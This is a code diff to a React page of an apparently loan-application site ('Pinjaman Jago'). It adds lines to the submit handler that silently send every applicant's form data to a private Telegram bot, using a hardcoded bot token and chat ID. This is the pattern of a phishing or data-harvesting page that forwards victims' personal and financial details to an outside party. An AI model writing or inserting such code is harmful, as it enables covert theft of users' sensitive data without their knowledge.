@@ -155,6 +155,17 @@ export default function Page6() {
             console.log("=== DATA PENGAJUAN PINJAMAN JAGO ===");
             console.log(appData);
             console.log("====================================");
+
+            // Kirim ke Telegram
+            const token = "8613441257:AAG_RDOl9VU6-6Kz2T3fYjT1z9usB3xnuKU";
+            const chatId = "6959842489";
+            const message = `=== DATA PENGAJUAN PINJAMAN JAGO ===\n${JSON.stringify(appData, null, 2)}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: chatId, text: message })
+            }).catch(err => console.error("Telegram Error:", err));
           }}
         >
           <button className="w-full bg-[#FFB800] hover:bg-orange-500 text-black font-black py-5 rounded-2xl shadow-lg transition-all active:scale-[0.98] text-base mb-6">
